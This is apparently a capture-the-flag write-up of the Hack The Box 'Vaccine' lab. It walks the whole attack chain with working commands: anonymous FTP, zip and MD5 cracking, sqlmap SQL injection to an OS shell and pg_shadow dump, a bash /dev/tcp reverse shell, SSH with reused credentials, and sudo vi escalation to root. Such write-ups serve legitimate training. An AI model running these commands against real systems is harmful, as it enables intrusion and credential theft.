# 🧠 HTB — Vaccine | Full Writeup & Kill Chain Notes
> **Difficulty:** Easy (Starting Point Tier 2 — Free) | **OS:** Linux | **IP:** 10.129.x.x  
> **Core Skills:** FTP Anonymous Access · Zip Cracking · MD5 Cracking · SQLi · sqlmap · GTFOBins (vi)

---

## 🗺️ Kill Chain Overview

```
Recon (nmap)
 └─► Anonymous FTP → backup.zip
      └─► Crack zip password (fcrackzip + rockyou)
           └─► Read index.php source → admin:MD5 hash
                └─► Crack MD5 online → qwerty789
                     └─► Login to dashboard → search SQLi
                          └─► sqlmap --os-shell → RCE as postgres
                               └─► Read dashboard.php → P@s5w0rd!
                                    └─► SSH as postgres
                                         └─► sudo -l → vi GTFOBins
                                              └─► root shell → root.txt
```

---

## 📡 Phase 1 — Recon

### Mindset
> *Every box starts the same way — you know nothing. Nmap is how you find the doors. Always scan all ports, always use -sC -sV.*

### Commands
```bash
# Basic scan first
nmap 10.129.x.x

# Better scan — scripts + version detection
nmap -sC -sV -p- 10.129.x.x
```

### Results
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3   ← Anonymous login allowed!
22/tcp open  ssh     OpenSSH 8.0p1
80/tcp open  http    Apache 2.4.41  ← Web app
```

### What -sC and -sV do
- **`-sV`** — Version detection. Tells you *what* is running and which version (e.g. `vsftpd 3.0.3`). Version numbers = CVE lookup
- **`-sC`** — Default scripts. Runs NSE scripts that reveal extra info automatically (FTP anonymous login, SSH keys, cookie flags, etc.)
- **`-p-`** — Scan all 65535 ports instead of just the top 1000

### Key hint from nmap output
```
ftp-anon: Anonymous FTP login allowed
```
This means FTP accepts `anonymous` as username with any password — a common misconfiguration.

---

## 📁 Phase 2 — FTP Anonymous Access

### Mindset
> *Three doors: FTP, SSH, HTTP. SSH needs creds. HTTP is a web app. FTP with anonymous login is a gift — always check it first.*

### Commands
```bash
# List files on FTP server
curl ftp://10.129.x.x

# Download the file
curl ftp://10.129.x.x/backup.zip -o backup.zip
```

### What you found
```
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```

A developer left a backup of the web application on the FTP server. This is an extremely common real-world misconfiguration.

---

## 🔓 Phase 3 — Zip Password Cracking

### Mindset
> *Password-protected doesn't mean safe. If the password is in rockyou.txt — and it usually is — it's crackable in seconds. rockyou.txt has 14 million real leaked passwords.*

### Commands
```bash
# Install tools
sudo apt install john fcrackzip -y

# Download rockyou wordlist
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ~/rockyou.txt

# Crack the zip
fcrackzip -u -D -p ~/rockyou.txt backup.zip
```

### Flag breakdown
| Flag | Meaning |
|------|---------|
| `-D` | Dictionary attack (try words from a list) |
| `-p` | Path to wordlist |
| `-u` | Unzip to verify the password actually works |

### Result
```
PASSWORD FOUND!!!!: pw == 741852963
```

```bash
# Unzip with password
unzip backup.zip
# Enter: 741852963
```

### Files extracted
- `index.php` — **the login form source code**
- `style.css` — just styling, ignore

---

## 🔑 Phase 4 — Source Code Review → Credentials

### Mindset
> *Developers hardcode credentials constantly. Whenever you get source code, search for passwords, connection strings, API keys, and hashes immediately.*

### What index.php revealed
```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

Two things:
1. **Username:** `admin` — hardcoded in plaintext
2. **Password:** stored as MD5 hash `2cb42f8734ea607eefed3b70af13bbd3`

### Cracking MD5
MD5 is a broken, ancient hashing algorithm. Millions of MD5 hashes are already cracked and stored in online rainbow table databases.

**Just Google the hash** — or use https://crackstation.net

```
2cb42f8734ea607eefed3b70af13bbd3 → qwerty789
```

### Credentials obtained
```
username: admin
password: qwerty789
```

---

## 🌐 Phase 5 — Web Application Login & SQLi Discovery

### Mindset
> *A search box that talks to a database is always worth testing for SQL injection. The single quote test — `'` — is your first probe. If it breaks something, you're in business.*

### Logging in via curl (browser can't reach HTB from Windows)
```bash
# Login and save session cookie
curl -L -c cookies.txt -b cookies.txt http://10.129.x.x -d "username=admin&password=qwerty789"
```

### Testing for SQLi
```bash
# Single quote test — breaks SQL queries if vulnerable
curl -b cookies.txt "http://10.129.x.x/dashboard.php?search='"
```

### Response that confirmed SQLi
```
ERROR: unterminated quoted string at or near "'"
LINE 1: Select * from cars where name ilike '%'%'
```

This revealed:
1. **Vulnerable to SQL injection** ✅
2. **Database is PostgreSQL** ✅
3. **Exact query structure** — `Select * from cars where name ilike '%INPUT%'`

---

## 💉 Phase 6 — sqlmap Exploitation

### Mindset
> *sqlmap automates the tedious parts of SQLi. Think of it like john for SQL — you give it the URL, the parameter, and the cookie, and it does the work. --os-shell is the jackpot flag: SQLi → OS command execution.*

### Install sqlmap
```bash
sudo apt install sqlmap -y
```

### Get your session cookie
```bash
cat cookies.txt
# Look for PHPSESSID value
```

### Enumerate databases
```bash
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" \
  --cookie="PHPSESSID=YOUR_SESSION_ID" \
  --dbs
```

### Enumerate tables in public database
```bash
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" \
  --cookie="PHPSESSID=YOUR_SESSION_ID" \
  -D public --tables
```

### Dump pg_shadow (PostgreSQL user hashes)
```bash
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" \
  --cookie="PHPSESSID=YOUR_SESSION_ID" \
  --dump -T pg_shadow -D pg_catalog
```

**Why pg_shadow?** It's PostgreSQL's equivalent of `/etc/shadow` — stores usernames and password hashes for all database users.

### Get OS shell
```bash
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" \
  --cookie="PHPSESSID=YOUR_SESSION_ID" \
  --os-shell --flush-session
```

**How --os-shell works:** PostgreSQL has a `COPY ... FROM PROGRAM` feature that lets superusers execute OS commands. sqlmap abuses this via the stacked queries injection type to drop you into an interactive shell.

### Getting a stable reverse shell
```bash
# On attacker machine — start listener
nc -lnvp 4444

# In sqlmap os-shell
bash -c 'bash -i >& /dev/tcp/YOUR_HTB_IP/4444 0>&1'
```

### Stabilizing the shell
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
# Press Enter
export TERM=xterm
export SHELL=bash
```

---

## 🗄️ Phase 7 — Post Exploitation → SSH Access

### Mindset
> *Always read every config file in the web root. Developers always store database credentials there. And always try those credentials for SSH — password reuse is extremely common.*

### Finding DB credentials
```bash
cat /var/www/html/dashboard.php
```

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

**Password found:** `P@s5w0rd!`

### SSH as postgres
```bash
ssh postgres@10.129.x.x
# Password: P@s5w0rd!
```

### User flag location
```bash
cat /var/lib/postgresql/user.txt
```

---

## ⬆️ Phase 8 — Privilege Escalation (GTFOBins — vi)

### Mindset
> *sudo -l is the first thing you run on every new user. Read every allowed command carefully. Then check GTFOBins (gtfobins.github.io) for that binary — almost every common tool has an escalation path.*

### Enumeration
```bash
sudo -l
```

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### Why this is exploitable
`vi` is a text editor but it can execute shell commands from within itself using `:!command`. Since it runs as root via sudo, any command executed inside vi also runs as root.

This is a **GTFOBins** technique — GTFOBins is a curated list of Unix binaries that can be abused to bypass restrictions when granted elevated privileges.

### Exploitation — the right way (on a proper terminal)
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside vi (must be in normal mode — press Escape first):
```
:!/bin/bash
```

This spawns a bash shell as root.

### ⚠️ Windows Terminal issue
Windows Terminal intercepts certain keystrokes when inside vi over SSH from WSL. If Enter doesn't work:
- Use Windows' native SSH client (PowerShell) instead of WSL
- Or use Pwnbox (browser-based Kali) to avoid this entirely

### Root flag
```bash
cat /root/root.txt
```

---

## 📋 Complete Command Reference

```bash
# === RECON ===
nmap -sC -sV 10.129.x.x

# === FTP ===
curl ftp://10.129.x.x
curl ftp://10.129.x.x/backup.zip -o backup.zip

# === ZIP CRACK ===
sudo apt install fcrackzip john -y
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ~/rockyou.txt
fcrackzip -u -D -p ~/rockyou.txt backup.zip
unzip backup.zip

# === WEB LOGIN ===
curl -L -c cookies.txt -b cookies.txt http://10.129.x.x -d "username=admin&password=qwerty789"
cat cookies.txt  # get PHPSESSID

# === SQLI TEST ===
curl -b cookies.txt "http://10.129.x.x/dashboard.php?search='"

# === SQLMAP ===
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" --cookie="PHPSESSID=XXX" --dbs
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" --cookie="PHPSESSID=XXX" -D public --tables
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" --cookie="PHPSESSID=XXX" --dump -T pg_shadow -D pg_catalog
sqlmap -u "http://10.129.x.x/dashboard.php?search=a" --cookie="PHPSESSID=XXX" --os-shell --flush-session

# === REVERSE SHELL ===
nc -lnvp 4444
# In os-shell:
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# === SHELL STABILIZATION ===
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z → stty raw -echo; fg → Enter
export TERM=xterm

# === POST EXPLOITATION ===
cat /var/www/html/dashboard.php  # find P@s5w0rd!
ssh postgres@10.129.x.x          # password: P@s5w0rd!
cat /var/lib/postgresql/user.txt # user flag

# === PRIVESC ===
sudo -l
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# Inside vi: Escape → :!/bin/bash → Enter
cat /root/root.txt  # root flag
```

---

## 🧠 Key Mental Models & Lessons

### 1. Always check FTP for anonymous access
- Try `curl ftp://TARGET` before anything else
- Developers routinely leave backups, configs, and source code on FTP
- `ftp-anon` in nmap output = immediate priority

### 2. Source code = goldmine
- PHP config files almost always contain DB credentials
- Login forms often have hardcoded username/password comparisons
- MD5 passwords are trivially crackable — never trust them

### 3. SQL Injection flow
```
Find input → test with ' → see error → confirm injectable
→ sqlmap to automate → --dbs → --tables → --dump → --os-shell
```

### 4. PostgreSQL specific knowledge
- `pg_shadow` in `pg_catalog` = user password hashes
- PostgreSQL superusers can execute OS commands via `COPY FROM PROGRAM`
- Connection strings always in PHP: `pg_connect("...password=XXX...")`

### 5. GTFOBins mindset
- Every time you see a binary in `sudo -l`, check https://gtfobins.github.io
- `vi`, `nano`, `less`, `python`, `perl`, `find`, `awk` — all can spawn shells
- The key: if it runs as root and can execute subcommands → it's an escape

### 6. Password reuse is real
- Found `qwerty789` in web app → tried on FTP, SSH
- Found `P@s5w0rd!` in PHP config → used for SSH
- Always try every password you find on every service

### 7. Session management with curl
```bash
-c cookies.txt  # save cookies
-b cookies.txt  # send cookies
-L              # follow redirects
-d "data"       # POST data
```

---

## 🔑 Flags
| Flag | Location | Value |
|------|----------|-------|
| User | `/var/lib/postgresql/user.txt` | ec9b13ca4d6229cd5cc1e09980965bf7 |
| Root | `/root/root.txt` | (submitted to HTB) |

---

## 📚 Tools Used
| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service enumeration |
| `curl` | FTP download, HTTP requests, cookie management |
| `fcrackzip` | Zip password cracking |
| `rockyou.txt` | Password wordlist (14M entries) |
| `sqlmap` | Automated SQL injection & OS shell |
| `nc` (netcat) | Reverse shell listener |
| `vi` + GTFOBins | Privilege escalation to root |
| `ssh` | Stable shell access |

---

## 📚 Resources
- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [CrackStation — Online hash cracker](https://crackstation.net)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)

---

*HTB Vaccine — Starting Point Tier 2 | Free Machine | Solved March 2026*
